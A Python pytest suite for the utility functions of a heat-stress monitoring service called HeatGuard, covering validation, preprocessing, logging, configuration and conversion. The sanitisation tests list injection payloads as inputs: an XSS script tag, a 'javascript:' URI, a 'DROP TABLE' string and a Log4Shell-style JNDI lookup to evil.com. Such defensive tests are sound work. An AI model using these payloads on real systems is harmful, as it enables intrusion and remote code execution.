"""
Utility Function Tests
======================

Comprehensive tests for HeatGuard utility functions and validation logic:
- Input validation and sanitization
- Data preprocessing utilities
- Logging utilities and configuration
- Configuration validation
- Mathematical utilities
- String processing and formatting
- Date/time utilities
- File I/O utilities
- Error handling utilities
- Data conversion utilities
"""

import pytest
import os
import tempfile
import json
from datetime import datetime, timedelta
from unittest.mock import Mock, patch, mock_open
from typing import Dict, List, Any
import pandas as pd
import numpy as np

from app.utils.validators import ValidationError
from app.utils.logger import setup_logging, get_logger
from app.utils.data_preprocessor import DataPreprocessor


class TestInputValidation:
    """Test input validation utilities."""

    @pytest.fixture
    def validator(self):
        """Create a validator instance."""
        from app.utils.validators import WorkerDataValidator
        return WorkerDataValidator()

    def test_validate_age_success(self, validator):
        """Test successful age validation."""
        valid_ages = [18, 25, 35, 45, 65]

        for age in valid_ages:
            result = validator.validate_age(age)
            assert result is True

    def test_validate_age_failure(self, validator):
        """Test age validation failures."""
        invalid_ages = [-1, 0, 17, 100, 150, "thirty", None, float('inf')]

        for age in invalid_ages:
            with pytest.raises(ValidationError):
                validator.validate_age(age)

    def test_validate_gender_success(self, validator):
        """Test successful gender validation."""
        valid_genders = [0, 1]

        for gender in valid_genders:
            result = validator.validate_gender(gender)
            assert result is True

    def test_validate_gender_failure(self, validator):
        """Test gender validation failures."""
        invalid_genders = [-1, 2, 0.5, "male", "female", None]

        for gender in invalid_genders:
            with pytest.raises(ValidationError):
                validator.validate_gender(gender)

    def test_validate_temperature_success(self, validator):
        """Test successful temperature validation."""
        valid_temperatures = [-10.0, 0.0, 25.5, 35.0, 50.0]

        for temp in valid_temperatures:
            result = validator.validate_temperature(temp)
            assert result is True

    def test_validate_temperature_failure(self, validator):
        """Test temperature validation failures."""
        invalid_temperatures = [-50.0, 100.0, "hot", None, float('inf')]

        for temp in invalid_temperatures:
            with pytest.raises(ValidationError):
                validator.validate_temperature(temp)

    def test_validate_humidity_success(self, validator):
        """Test successful humidity validation."""
        valid_humidities = [0.0, 25.5, 50.0, 75.5, 100.0]

        for humidity in valid_humidities:
            result = validator.validate_humidity(humidity)
            assert result is True

    def test_validate_humidity_failure(self, validator):
        """Test humidity validation failures."""
        invalid_humidities = [-10.0, 110.0, "humid", None]

        for humidity in invalid_humidities:
            with pytest.raises(ValidationError):
                validator.validate_humidity(humidity)

    def test_validate_heart_rate_success(self, validator):
        """Test successful heart rate validation."""
        valid_heart_rates = [40.0, 60.0, 75.0, 100.0, 200.0]

        for hr in valid_heart_rates:
            result = validator.validate_heart_rate(hr)
            assert result is True

    def test_validate_heart_rate_failure(self, validator):
        """Test heart rate validation failures."""
        invalid_heart_rates = [0, 20, 250, 500, "fast", None]

        for hr in invalid_heart_rates:
            with pytest.raises(ValidationError):
                validator.validate_heart_rate(hr)

    def test_validate_hrv_metrics_success(self, validator):
        """Test successful HRV metrics validation."""
        valid_hrv_data = {
            'hrv_mean_nni': 800.0,
            'hrv_rmssd': 35.5,
            'hrv_sdnn': 48.2,
            'hrv_lf': 980.0,
            'hrv_hf': 670.0,
            'hrv_lf_hf_ratio': 1.46
        }

        for metric, value in valid_hrv_data.items():
            result = validator.validate_hrv_metric(metric, value)
            assert result is True

    def test_validate_hrv_metrics_failure(self, validator):
        """Test HRV metrics validation failures."""
        invalid_hrv_data = {
            'hrv_mean_nni': -100,      # Negative value
            'hrv_rmssd': 500,          # Too high
            'hrv_sdnn': "invalid",     # Non-numeric
            'hrv_lf_hf_ratio': -1      # Negative ratio
        }

        for metric, value in invalid_hrv_data.items():
            with pytest.raises(ValidationError):
                validator.validate_hrv_metric(metric, value)

    def test_validate_complete_worker_data_success(self, validator, sample_worker_data):
        """Test complete worker data validation success."""
        result = validator.validate_worker_data(sample_worker_data)

        assert result['valid'] is True
        assert len(result['errors']) == 0
        assert result['data_quality_score'] > 0.8

    def test_validate_complete_worker_data_failure(self, validator, invalid_worker_data):
        """Test complete worker data validation with failures."""
        result = validator.validate_worker_data(invalid_worker_data)

        assert result['valid'] is False
        assert len(result['errors']) > 0
        assert result['data_quality_score'] < 0.5

    def test_validate_batch_data(self, validator, batch_worker_data):
        """Test batch data validation."""
        result = validator.validate_batch_data(batch_worker_data)

        assert 'total_records' in result
        assert 'valid_records' in result
        assert 'invalid_records' in result
        assert result['total_records'] == len(batch_worker_data)

    def test_sanitize_input_data(self, validator):
        """Test input data sanitization."""
        dirty_data = {
            'Age': '  30  ',           # Extra whitespace
            'Gender': 1.0,             # Float instead of int
            'Temperature': '25.5',     # String number
            'Humidity': 60,            # Int instead of float
            'worker_id': '<script>alert("xss")</script>'  # Potential XSS
        }

        sanitized = validator.sanitize_input(dirty_data)

        assert sanitized['Age'] == 30
        assert sanitized['Gender'] == 1
        assert sanitized['Temperature'] == 25.5
        assert sanitized['Humidity'] == 60.0
        assert '<script>' not in sanitized['worker_id']

    def test_validate_api_key_format(self, validator):
        """Test API key format validation."""
        valid_keys = [
            'heatguard-api-key-demo-12345',
            'heatguard-readonly-key-67890',
            'heatguard-admin-key-abcdef'
        ]

        invalid_keys = [
            '',
            'invalid-key',
            'heatguard',
            'too-short',
            'key with spaces',
            None
        ]

        for key in valid_keys:
            assert validator.validate_api_key_format(key) is True

        for key in invalid_keys:
            with pytest.raises(ValidationError):
                validator.validate_api_key_format(key)

    def test_validate_request_size(self, validator):
        """Test request size validation."""
        small_data = {'Age': 30, 'Gender': 1}
        large_data = {f'field_{i}': f'value_{i}' for i in range(1000)}

        assert validator.validate_request_size(small_data, max_size_kb=10) is True

        with pytest.raises(ValidationError):
            validator.validate_request_size(large_data, max_size_kb=1)


class TestDataPreprocessor:
    """Test data preprocessing utilities."""

    @pytest.fixture
    def preprocessor(self):
        """Create a data preprocessor instance."""
        return DataPreprocessor()

    def test_preprocess_worker_data(self, preprocessor, sample_worker_data):
        """Test worker data preprocessing."""
        processed = preprocessor.preprocess_worker_data(sample_worker_data)

        assert 'Age' in processed
        assert 'Gender' in processed
        assert processed['Age'] == sample_worker_data['Age']

        # Should add derived features
        assert 'age_group' in processed
        assert 'temperature_fahrenheit' in processed

    def test_fill_missing_values(self, preprocessor, missing_features_data):
        """Test missing value imputation."""
        filled_data = preprocessor.fill_missing_values(missing_features_data)

        # Missing HRV features should be filled with reasonable defaults
        assert 'hrv_mean_nni' in filled_data
        assert 'hrv_rmssd' in filled_data
        assert filled_data['hrv_mean_nni'] > 0

    def test_normalize_features(self, preprocessor, sample_worker_data):
        """Test feature normalization."""
        normalized = preprocessor.normalize_features(sample_worker_data)

        # Normalized features should be in reasonable ranges
        assert 0 <= normalized['Age_normalized'] <= 1
        if 'hrv_mean_hr_normalized' in normalized:
            assert 0 <= normalized['hrv_mean_hr_normalized'] <= 1

    def test_create_derived_features(self, preprocessor, sample_worker_data):
        """Test derived feature creation."""
        enhanced = preprocessor.create_derived_features(sample_worker_data)

        # Should create derived features
        expected_derived = [
            'age_group', 'temperature_fahrenheit', 'heat_index',
            'bmi_category', 'fitness_level_estimated'
        ]

        for feature in expected_derived:
            if feature in enhanced:  # Some may not be created depending on available data
                assert enhanced[feature] is not None

    def test_convert_units(self, preprocessor):
        """Test unit conversion utilities."""
        # Temperature conversions
        assert abs(preprocessor.celsius_to_fahrenheit(0) - 32.0) < 0.1
        assert abs(preprocessor.celsius_to_fahrenheit(100) - 212.0) < 0.1
        assert abs(preprocessor.fahrenheit_to_celsius(32) - 0.0) < 0.1

        # Heart rate to interval conversions
        assert abs(preprocessor.heart_rate_to_nni(60) - 1000.0) < 1.0
        assert abs(preprocessor.nni_to_heart_rate(1000) - 60.0) < 0.1

    def test_calculate_heat_index(self, preprocessor):
        """Test heat index calculation."""
        # Standard conditions
        heat_index = preprocessor.calculate_heat_index(80, 60)  # F, %
        assert heat_index >= 80

        # Hot and humid conditions
        dangerous_heat_index = preprocessor.calculate_heat_index(100, 90)
        assert dangerous_heat_index > 130

    def test_preprocess_batch_data(self, preprocessor, batch_worker_data):
        """Test batch data preprocessing."""
        df = pd.DataFrame(batch_worker_data)
        processed_df = preprocessor.preprocess_batch_data(df)

        assert len(processed_df) == len(batch_worker_data)
        assert 'age_group' in processed_df.columns
        assert processed_df['Age'].notna().all()  # No NaN values

    def test_validate_feature_ranges(self, preprocessor, sample_worker_data):
        """Test feature range validation."""
        validation_result = preprocessor.validate_feature_ranges(sample_worker_data)

        assert validation_result['valid'] in [True, False]
        assert 'out_of_range_features' in validation_result
        assert isinstance(validation_result['out_of_range_features'], list)

    def test_handle_outliers(self, preprocessor):
        """Test outlier handling."""
        data_with_outliers = {
            'Age': 30,
            'hrv_mean_hr': 500,  # Outlier - too high
            'Temperature': -50,   # Outlier - too low
            'Humidity': 60
        }

        cleaned_data = preprocessor.handle_outliers(data_with_outliers)

        # Outliers should be clipped or removed
        assert cleaned_data['hrv_mean_hr'] < 250  # Should be clipped
        assert cleaned_data['Temperature'] > -20  # Should be clipped


class TestLoggingUtilities:
    """Test logging utilities and configuration."""

    def test_setup_logging_file(self, temp_log_file):
        """Test logging setup with file output."""
        setup_logging(
            log_level='INFO',
            log_file=temp_log_file,
            json_format=False
        )

        logger = get_logger('test_logger')
        logger.info('Test log message')

        # Verify log file was created and contains message
        assert os.path.exists(temp_log_file)
        with open(temp_log_file, 'r') as f:
            content = f.read()
            assert 'Test log message' in content

    def test_setup_logging_json_format(self, temp_log_file):
        """Test logging setup with JSON format."""
        setup_logging(
            log_level='DEBUG',
            log_file=temp_log_file,
            json_format=True
        )

        logger = get_logger('json_test_logger')
        logger.info('JSON test message', extra={'worker_id': 'test_001', 'risk_score': 0.45})

        # Verify JSON format in log file
        with open(temp_log_file, 'r') as f:
            content = f.read()
            # Should contain JSON-like structure
            assert 'worker_id' in content
            assert 'risk_score' in content

    def test_get_logger_instance(self):
        """Test logger instance retrieval."""
        logger1 = get_logger('test_module')
        logger2 = get_logger('test_module')

        # Should return same logger instance for same name
        assert logger1 is logger2

        logger3 = get_logger('different_module')
        # Should return different logger for different name
        assert logger1 is not logger3

    def test_log_api_request(self, temp_log_file):
        """Test API request logging."""
        from app.utils.logger import log_api_request

        setup_logging(log_file=temp_log_file)

        log_api_request(
            endpoint='/api/v1/predict',
            method='POST',
            status_code=200,
            response_time=145.6,
            user_id='test_user',
            request_id='req_12345'
        )

        # Verify API request was logged
        with open(temp_log_file, 'r') as f:
            content = f.read()
            assert '/api/v1/predict' in content
            assert '200' in content
            assert 'req_12345' in content

    def test_log_security_event(self, temp_log_file):
        """Test security event logging."""
        from app.utils.logger import log_security_event

        setup_logging(log_file=temp_log_file)

        log_security_event(
            event_type='authentication_failure',
            details={'api_key': 'invalid_key', 'ip_address': '192.168.1.100'},
            severity='warning'
        )

        with open(temp_log_file, 'r') as f:
            content = f.read()
            assert 'authentication_failure' in content
            assert '192.168.1.100' in content

    def test_log_performance_metrics(self, temp_log_file):
        """Test performance metrics logging."""
        from app.utils.logger import log_performance_metrics

        setup_logging(log_file=temp_log_file)

        log_performance_metrics(
            operation='single_prediction',
            duration_ms=156.7,
            memory_usage_mb=64.5,
            cpu_usage_percent=25.3
        )

        with open(temp_log_file, 'r') as f:
            content = f.read()
            assert 'single_prediction' in content
            assert '156.7' in content


class TestConfigurationUtilities:
    """Test configuration validation and utilities."""

    def test_validate_settings(self):
        """Test settings validation."""
        from app.config.settings import Settings

        # Valid settings
        valid_settings = {
            'DEBUG': False,
            'HOST': '0.0.0.0',
            'PORT': 8000,
            'MODEL_DIR': 'thermal_comfort_model',
            'LOG_LEVEL': 'INFO'
        }

        settings = Settings(**valid_settings)
        assert settings.DEBUG is False
        assert settings.PORT == 8000

    def test_validate_model_config(self):
        """Test model configuration validation."""
        from app.config.model_config import MODEL_CONFIG

        assert 'conservative_bias' in MODEL_CONFIG
        assert 'risk_thresholds' in MODEL_CONFIG
        assert isinstance(MODEL_CONFIG.conservative_bias, float)
        assert 0 <= MODEL_CONFIG.conservative_bias <= 1

    def test_validate_osha_standards(self):
        """Test OSHA standards configuration."""
        from app.config.model_config import OSHA_STANDARDS

        assert 'temperature_thresholds' in OSHA_STANDARDS
        assert 'humidity_limits' in OSHA_STANDARDS
        assert 'work_rest_ratios' in OSHA_STANDARDS

    def test_environment_variable_parsing(self):
        """Test environment variable parsing."""
        with patch.dict(os.environ, {'HEATGUARD_DEBUG': 'true', 'HEATGUARD_PORT': '9000'}):
            from app.config.settings import get_settings
            settings = get_settings()

            # Environment variables should override defaults
            # (Exact behavior depends on implementation)

    def test_config_validation_errors(self):
        """Test configuration validation with invalid values."""
        from app.config.settings import Settings

        # Invalid port
        with pytest.raises(ValueError):
            Settings(PORT=-1)

        # Invalid log level
        with pytest.raises(ValueError):
            Settings(LOG_LEVEL='INVALID_LEVEL')


class TestMathematicalUtilities:
    """Test mathematical utility functions."""

    def test_calculate_percentiles(self):
        """Test percentile calculations."""
        from app.utils.math_utils import calculate_percentiles

        data = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
        percentiles = calculate_percentiles(data, [25, 50, 75, 95])

        assert percentiles[25] == 3.25
        assert percentiles[50] == 5.5
        assert percentiles[75] == 7.75

    def test_moving_average(self):
        """Test moving average calculation."""
        from app.utils.math_utils import moving_average

        data = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
        ma = moving_average(data, window=3)

        assert len(ma) == len(data) - 2  # Window size - 1
        assert ma[0] == 2.0  # (1+2+3)/3
        assert ma[1] == 3.0  # (2+3+4)/3

    def test_z_score_calculation(self):
        """Test z-score calculation."""
        from app.utils.math_utils import calculate_z_score

        values = [1, 2, 3, 4, 5]
        mean = 3
        std = 1.58

        z_scores = [calculate_z_score(v, mean, std) for v in values]

        # First value (1) should have negative z-score
        assert z_scores[0] < 0
        # Middle value (3) should have z-score near 0
        assert abs(z_scores[2]) < 0.1

    def test_statistical_summary(self):
        """Test statistical summary calculation."""
        from app.utils.math_utils import statistical_summary

        data = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
        summary = statistical_summary(data)

        assert summary['count'] == 10
        assert summary['mean'] == 5.5
        assert summary['median'] == 5.5
        assert summary['std'] > 0
        assert summary['min'] == 1
        assert summary['max'] == 10

    def test_interpolation(self):
        """Test data interpolation."""
        from app.utils.math_utils import linear_interpolate

        x_values = [0, 1, 2, 3, 4]
        y_values = [0, 1, 4, 9, 16]

        # Interpolate at x = 2.5
        interpolated = linear_interpolate(x_values, y_values, 2.5)
        assert 6 < interpolated < 7  # Should be between 4 and 9

    def test_risk_score_normalization(self):
        """Test risk score normalization."""
        from app.utils.math_utils import normalize_risk_score

        raw_scores = [-1, 0, 0.5, 1, 2]
        normalized = [normalize_risk_score(score) for score in raw_scores]

        # All scores should be between 0 and 1
        for score in normalized:
            assert 0 <= score <= 1


class TestStringUtilities:
    """Test string processing utilities."""

    def test_sanitize_string_input(self):
        """Test string input sanitization."""
        from app.utils.string_utils import sanitize_string

        dangerous_inputs = [
            '<script>alert("xss")</script>',
            'DROP TABLE users; --',
            'javascript:alert("test")',
            '${jndi:ldap://evil.com/a}'
        ]

        for dangerous_input in dangerous_inputs:
            sanitized = sanitize_string(dangerous_input)
            assert '<script>' not in sanitized
            assert 'DROP TABLE' not in sanitized
            assert 'javascript:' not in sanitized
            assert '${jndi:' not in sanitized

    def test_format_worker_id(self):
        """Test worker ID formatting."""
        from app.utils.string_utils import format_worker_id

        inputs = [
            ('test_worker_001', 'test_worker_001'),
            ('  WORKER_123  ', 'worker_123'),
            ('worker@company.com', 'worker_company_com'),
            ('', 'anonymous_worker')
        ]

        for input_id, expected in inputs:
            formatted = format_worker_id(input_id)
            assert formatted == expected

    def test_generate_request_id(self):
        """Test request ID generation."""
        from app.utils.string_utils import generate_request_id

        request_id = generate_request_id()

        assert isinstance(request_id, str)
        assert len(request_id) > 10
        assert request_id.startswith('req_')

        # Should be unique
        request_id2 = generate_request_id()
        assert request_id != request_id2

    def test_format_recommendations(self):
        """Test OSHA recommendations formatting."""
        from app.utils.string_utils import format_osha_recommendations

        raw_recommendations = [
            'increase water intake',
            'TAKE REST BREAKS',
            'contact_medical_personnel'
        ]

        formatted = format_osha_recommendations(raw_recommendations)

        for rec in formatted:
            # Should be properly capitalized
            assert rec[0].isupper()
            # Should have proper spacing
            assert '_' not in rec


class TestDateTimeUtilities:
    """Test date/time utility functions."""

    def test_format_timestamp(self):
        """Test timestamp formatting."""
        from app.utils.datetime_utils import format_timestamp

        now = datetime.now()
        formatted = format_timestamp(now)

        assert isinstance(formatted, str)
        assert 'T' in formatted  # ISO format
        assert len(formatted) > 10

    def test_parse_timestamp(self):
        """Test timestamp parsing."""
        from app.utils.datetime_utils import parse_timestamp

        timestamp_str = '2024-01-01T12:00:00'
        parsed = parse_timestamp(timestamp_str)

        assert isinstance(parsed, datetime)
        assert parsed.year == 2024
        assert parsed.month == 1
        assert parsed.day == 1

    def test_calculate_time_difference(self):
        """Test time difference calculation."""
        from app.utils.datetime_utils import calculate_time_difference

        start = datetime(2024, 1, 1, 10, 0, 0)
        end = datetime(2024, 1, 1, 10, 5, 30)

        diff = calculate_time_difference(start, end)

        assert diff['seconds'] == 330  # 5 minutes 30 seconds
        assert diff['minutes'] == 5.5
        assert diff['hours'] == 5.5 / 60

    def test_get_business_hours(self):
        """Test business hours validation."""
        from app.utils.datetime_utils import is_business_hours

        # Monday at 10 AM
        business_time = datetime(2024, 1, 1, 10, 0)  # Assuming Jan 1, 2024 is Monday
        assert is_business_hours(business_time) is True

        # Sunday at 10 AM
        weekend_time = datetime(2024, 1, 7, 10, 0)  # Sunday
        assert is_business_hours(weekend_time) is False

        # Monday at 2 AM
        night_time = datetime(2024, 1, 1, 2, 0)
        assert is_business_hours(night_time) is False

    def test_schedule_next_maintenance(self):
        """Test maintenance scheduling."""
        from app.utils.datetime_utils import schedule_next_maintenance

        last_maintenance = datetime(2024, 1, 1, 12, 0)
        next_maintenance = schedule_next_maintenance(last_maintenance, interval_days=7)

        expected = last_maintenance + timedelta(days=7)
        assert next_maintenance == expected


class TestFileUtilities:
    """Test file I/O utility functions."""

    def test_safe_file_write(self, temp_log_file):
        """Test safe file writing with atomic operations."""
        from app.utils.file_utils import safe_write_file

        test_data = {'key': 'value', 'number': 123}

        success = safe_write_file(temp_log_file, json.dumps(test_data))

        assert success is True
        assert os.path.exists(temp_log_file)

        with open(temp_log_file, 'r') as f:
            written_data = json.loads(f.read())
            assert written_data == test_data

    def test_safe_file_read(self, temp_log_file):
        """Test safe file reading with error handling."""
        from app.utils.file_utils import safe_read_file

        # Write test data first
        test_content = "test file content"
        with open(temp_log_file, 'w') as f:
            f.write(test_content)

        # Read it back safely
        content = safe_read_file(temp_log_file)

        assert content == test_content

        # Test reading non-existent file
        content_nonexistent = safe_read_file('/nonexistent/file.txt')
        assert content_nonexistent is None

    def test_ensure_directory_exists(self):
        """Test directory creation utility."""
        from app.utils.file_utils import ensure_directory_exists

        temp_dir = tempfile.mkdtemp()
        test_path = os.path.join(temp_dir, 'new_dir', 'subdir')

        ensure_directory_exists(test_path)

        assert os.path.exists(test_path)
        assert os.path.isdir(test_path)

    def test_get_file_size(self, temp_log_file):
        """Test file size calculation."""
        from app.utils.file_utils import get_file_size

        test_content = "This is test content for size calculation"
        with open(temp_log_file, 'w') as f:
            f.write(test_content)

        size = get_file_size(temp_log_file)

        assert size == len(test_content)

    def test_rotate_log_files(self, temp_log_file):
        """Test log file rotation."""
        from app.utils.file_utils import rotate_log_file

        # Create a large log file
        large_content = "Log entry\n" * 1000
        with open(temp_log_file, 'w') as f:
            f.write(large_content)

        rotated = rotate_log_file(temp_log_file, max_size_mb=0.001)  # Very small size

        assert rotated is True
        # Should create backup file
        backup_file = f"{temp_log_file}.1"
        assert os.path.exists(backup_file)


class TestErrorHandlingUtilities:
    """Test error handling and exception utilities."""

    def test_safe_execute_with_retry(self):
        """Test safe execution with retry logic."""
        from app.utils.error_utils import safe_execute_with_retry

        # Function that fails twice then succeeds
        attempt_count = 0

        def failing_function():
            nonlocal attempt_count
            attempt_count += 1
            if attempt_count < 3:
                raise ConnectionError("Temporary failure")
            return "success"

        result = safe_execute_with_retry(failing_function, max_retries=3, delay=0.1)

        assert result == "success"
        assert attempt_count == 3

    def test_safe_execute_timeout(self):
        """Test safe execution with timeout."""
        from app.utils.error_utils import safe_execute_with_timeout
        import time

        def slow_function():
            time.sleep(2)
            return "completed"

        # Should timeout before completion
        result = safe_execute_with_timeout(slow_function, timeout=0.5)
        assert result is None

    def test_format_error_response(self):
        """Test error response formatting."""
        from app.utils.error_utils import format_error_response

        error = ValueError("Invalid input data")

        formatted = format_error_response(
            error,
            error_code="VALIDATION_ERROR",
            request_id="req_12345"
        )

        assert formatted['error_type'] == 'ValueError'
        assert formatted['error_code'] == 'VALIDATION_ERROR'
        assert formatted['request_id'] == 'req_12345'
        assert 'timestamp' in formatted

    def test_log_exception(self, temp_log_file):
        """Test exception logging."""
        from app.utils.error_utils import log_exception

        setup_logging(log_file=temp_log_file)

        try:
            raise ValueError("Test exception for logging")
        except ValueError as e:
            log_exception(e, context={'operation': 'test', 'worker_id': 'test_001'})

        with open(temp_log_file, 'r') as f:
            content = f.read()
            assert 'ValueError' in content
            assert 'Test exception for logging' in content
            assert 'test_001' in content


class TestDataConversionUtilities:
    """Test data conversion and formatting utilities."""

    def test_convert_prediction_response(self):
        """Test prediction response conversion."""
        from app.utils.conversion_utils import convert_prediction_response

        raw_response = {
            'worker_id': 'test_001',
            'risk_score': 0.75,
            'temperature_c': 35.0,
            'timestamp': datetime.now()
        }

        converted = convert_prediction_response(raw_response, include_fahrenheit=True)

        assert 'temperature_fahrenheit' in converted
        assert converted['temperature_fahrenheit'] == 95.0
        assert isinstance(converted['timestamp'], str)  # Should be serialized

    def test_convert_batch_results(self):
        """Test batch results conversion."""
        from app.utils.conversion_utils import convert_batch_results

        raw_batch = [
            {'worker_id': 'w1', 'risk_score': 0.3},
            {'worker_id': 'w2', 'risk_score': 0.7},
            {'worker_id': 'w3', 'risk_score': 0.9}
        ]

        converted = convert_batch_results(raw_batch, add_statistics=True)

        assert 'batch_statistics' in converted
        assert converted['batch_statistics']['avg_risk_score'] == 0.63
        assert converted['batch_statistics']['max_risk_score'] == 0.9

    def test_serialize_numpy_types(self):
        """Test NumPy type serialization."""
        from app.utils.conversion_utils import serialize_numpy_types

        data_with_numpy = {
            'float64_value': np.float64(0.75),
            'int32_value': np.int32(42),
            'array_value': np.array([1, 2, 3]),
            'regular_value': 'string'
        }

        serialized = serialize_numpy_types(data_with_numpy)

        assert isinstance(serialized['float64_value'], float)
        assert isinstance(serialized['int32_value'], int)
        assert isinstance(serialized['array_value'], list)
        assert serialized['regular_value'] == 'string'

    def test_format_osha_report(self):
        """Test OSHA report formatting."""
        from app.utils.conversion_utils import format_osha_report

        raw_data = {
            'period': '2024-Q1',
            'incidents': 5,
            'total_hours': 10000,
            'compliance_rate': 94.5
        }

        formatted = format_osha_report(raw_data)

        assert 'executive_summary' in formatted
        assert 'incident_rate' in formatted
        assert 'recommendations' in formatted
        assert formatted['incident_rate'] < 1.0  # Should be incidents per 100 workers


# Mark all utility tests as unit tests
for name, obj in list(globals().items()):
    if isinstance(obj, type) and name.startswith('Test'):
        obj = pytest.mark.unit(obj)